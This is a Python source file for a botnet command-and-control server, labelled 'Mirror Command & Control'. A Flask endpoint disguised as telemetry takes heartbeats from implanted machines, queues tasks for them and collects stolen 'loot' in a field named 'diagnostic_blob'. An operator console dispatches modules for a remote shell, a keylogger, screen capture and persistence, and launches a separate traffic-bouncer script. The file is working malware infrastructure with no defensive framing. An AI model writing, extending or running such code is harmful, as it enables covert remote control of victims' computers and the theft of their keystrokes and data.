import os
import sys
import threading
import time
import logging
import json
import msvcrt
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

active_bots = {}
task_queue = {}
loot_vault = []

# Internal ports used by the Bouncer
FLASK_PORT = 6969 
SHELL_PORT = 4444
GLOBAL_C2_URL = ""

@app.before_request
def normalize_ips():
    if request.remote_addr == "::1":
        request.environ['REMOTE_ADDR'] = "127.0.0.1"

def get_clean_ip():
    ip = request.remote_addr
    return "127.0.0.1" if ip == "::1" else ip

@app.route('/api/v2/telemetry', methods=['POST'])
def heartbeat():
    bot_ip = get_clean_ip()
    active_bots[bot_ip] = time.time()
    
    if bot_ip in task_queue and len(task_queue[bot_ip]) > 0:
        task = task_queue[bot_ip].pop(0)
        print(f"\033[94m[*] [PULSE] Heartbeat from {bot_ip} | [TASK] Dispatching Atom {task['atom_id']}\033[0m")
        packed_json = json.dumps(task, separators=(',', ':'))
        return app.response_class(response=packed_json, mimetype='application/json'), 200
    
    return "NO_TASK", 200

@app.route('/api/v2/task/push', methods=['POST'])
def push_task():
    bot_ip = request.args.get('ip')
    if bot_ip == "::1": bot_ip = "127.0.0.1"
    data = request.get_json(silent=True)
    if bot_ip and data:
        if bot_ip not in task_queue: task_queue[bot_ip] = []
        task_queue[bot_ip].append(data)
        return jsonify({"status": "queued"}), 200
    return jsonify({"status": "error"}), 400

@app.route('/api/v1/loot', methods=['POST'])
def receive_loot():
    bot_ip = get_clean_ip()
    data = request.get_json(silent=True)
    if data:
        blob = data.get('diagnostic_blob', 'empty')
        loot_vault.append(f"[{bot_ip}] {blob}")
    return jsonify({"status": "received"}), 200

def run_flask(port):
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("\033[91m")
    print(r"""
  _________.__            __    __                           .___
 /   _____/|  |__ _____ _/  |__/  |_  ___________   ____   __| _/
 \_____  \ |  |  \\__  \\   __\   __\/ __ \_  __ \_/ __ \ / __ | 
 /        \|   Y  \/ __ \|  |  |  | \  ___/|  | \/\  ___// /_/ | 
/_______  /|___|  (____  /__|  |__|  \___  >__|    \___  >____ | 
        \/      \/     \/                \/            \/     \/ 
                 MIRROR COMMAND & CONTROL v1.0
    """)
    print("\033[0m")

def bot_session(target_ip):
    while True:
        clear_screen()
        print_banner()
        print(f"\033[96m[--- ACTIVE SESSION: {target_ip} ---]\033[0m\n")
        
        bot_loot = [l for l in loot_vault if target_ip in l][-5:]
        if bot_loot:
            print("\033[93m[BOT TELEMETRY FEED]:\033[0m")
            for line in bot_loot: print(f"  {line}")
            print("-" * 50)

        print("  [1] Remote Shell (Atom 10)     [6] Screen Capture (Atom 06)")
        print("  [2] Keylogger (Atom 02)        [7] Persist (Atom 07)")
        print("  [0] Return to Main Menu")
        
        choice = ""
        while True:
            if msvcrt.kbhit():
                char = msvcrt.getch()
                choice = char.decode('utf-8').upper()
                while msvcrt.kbhit(): msvcrt.getch() # Flush
                break
            time.sleep(0.1)

        if choice == '0': break
        
        atom_id = 0
        payload = ""
        if choice == '1': 
            atom_id = 10
            # Launch Shell_Session pointing to our internal shell port
            subprocess.Popen(['start', 'cmd', '/k', f'python Shell_Session.py {GLOBAL_C2_URL} {target_ip} {SHELL_PORT}'], shell=True)
            print(f"\n\033[92m[+] Interactive Shell spawned for {target_ip}.\033[0m")
            time.sleep(1)
            # Shell push happens inside the Shell_Session script
            continue
            
        elif choice == '2': atom_id = 2; payload = "START"
            
        if atom_id > 0:
            task_queue[target_ip].append({"atom_id": atom_id, "payload": payload})
            print(f"\n\033[92m[+] ATOM {atom_id} Tasking Synchronized...\033[0m")
            time.sleep(1)

def main_loop():
    while True:
        try:
            clear_screen()
            print_banner()
            alive_bots = [ip for ip, t in active_bots.items() if time.time() - t < 300]
            print(f"\033[96m[--- MASTER CONTROL UNIT ---]\033[0m \033[92m(Pulse Nodes: {len(alive_bots)})\033[0m")
            print("  [1] Implant Manager")
            print("  [0] Terminate Mirror Network\n")
            
            choice = ""
            if msvcrt.kbhit():
                choice = msvcrt.getch().decode('utf-8')
                while msvcrt.kbhit(): msvcrt.getch()
            
            if choice == '1':
                while True:
                    clear_screen()
                    print("\033[96m[--- IMPLANT MANAGER ---]\033[0m ('q' to back)\n")
                    ips = list(active_bots.keys())
                    for i, ip in enumerate(ips): print(f"{i+1:<3} | {ip:<18}")
                    key = input("\n[?] Enter ID: ")
                    if key.lower() == 'q': break
                    if key.isdigit():
                        idx = int(key) - 1
                        if 0 <= idx < len(ips): bot_session(ips[idx]); break
            elif choice == '0': os._exit(0)
            time.sleep(0.5)
        except KeyboardInterrupt: os._exit(0)

if __name__ == '__main__':
    clear_screen()
    print_banner()
    
    # [ENI'S DYNAMIC SYNC] Read public port from Config.h
    public_port = 80
    try:
        with open("../Orchestrator/Config.h", "r") as f:
            for line in f:
                if "static const int   C2_PORT" in line:
                    public_port = int(line.split("=")[1].split(";")[0].strip())
                    break
    except: pass

    p_in = input(f"[?] PUBLIC Router Port [{public_port}]: ")
    if p_in: public_port = int(p_in)
    
    GLOBAL_C2_URL = f"http://127.0.0.1:{FLASK_PORT}"
    
    # 1. Start Internal Heartbeat Server
    threading.Thread(target=run_flask, args=(FLASK_PORT,), daemon=True).start()
    
    # 2. Start the Traffic Bouncer (Multiplexer)
    subprocess.Popen(['start', 'cmd', '/k', f'python The_Bouncer.py {public_port} {FLASK_PORT} {SHELL_PORT}'], shell=True)
    
    main_loop()
